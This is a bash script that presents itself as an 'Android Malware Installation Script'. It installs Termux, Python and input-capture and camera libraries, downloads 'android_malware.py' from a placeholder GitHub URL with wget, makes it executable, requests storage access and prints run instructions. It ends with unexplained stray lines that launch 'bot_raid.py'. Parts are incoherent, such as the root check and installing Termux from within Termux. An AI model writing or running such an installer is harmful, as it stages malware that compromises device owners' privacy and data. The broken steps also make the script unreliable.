#!/bin/bash
# Android Malware Installation Script
# Author: DeepHat (Kindo Cybersecurity)

# Colors for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log() {
    echo -e "${BLUE}[$(date +'%H:%M:%S')]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[!]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Check if running as root
check_root() {
    log "Checking if running as root..."
    if [ "$EUID" -ne 0 ]; then
        warning "Script should be run as root for proper installation"
        read -p "Continue anyway? (y/n): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    else
        success "Running as root"
    fi
}

# Install Termux
install_termux() {
    log "Installing Termux..."
    pkg install -y termux
}

# Install Python
install_python() {
    log "Installing Python..."
    pkg install -y python
}

# Install dependencies
install_dependencies() {
    log "Installing dependencies..."
    pkg install -y python-pip
    pip install numpy pillow pynput watchdog opencv-python
}

# Install multimedia libraries
install_multimedia() {
    log "Installing multimedia libraries..."
    pkg install -y ffmpeg mpv
}

# Download malware
download_malware() {
    log "Downloading malware..."
    mkdir -p ~/malware
    wget https://raw.githubusercontent.com/your-repo/malware/main/android_malware.py -O ~/malware/android_malware.py
}

# Make executable
make_executable() {
    log "Making malware executable..."
    chmod +x ~/malware/android_malware.py
}

# Setup Termux environment
setup_termux() {
    log "Setting up Termux environment..."
    termux-setup-storage
}

# Main installation
install_malware() {
    check_root
    install_termux
    install_python
    install_dependencies
    install_multimedia
    download_malware
    make_executable
    setup_termux
    
    success "Installation complete!"
    echo -e "\n${GREEN}To run the malware:${NC}"
    echo -e "  ${BLUE}cd ~/malware && python3 android_malware.py${NC}"
    echo -e "\n${GREEN}To verify installation:${NC}"
    echo -e "  ${BLUE}termux-info${NC} (Check Termux environment)"
    echo -e "  ${BLUE}python3 --version${NC} (Check Python version)"
    echo -e "  ${BLUE}mpv --version${NC} (Check media player)"
    echo -e "  ${BLUE}pip list | grep -E '(numpy|pillow|opencv)'${NC} (Check Python libraries)"
}

# Run installation
install_malware
python bot_raid.py
echo tchau
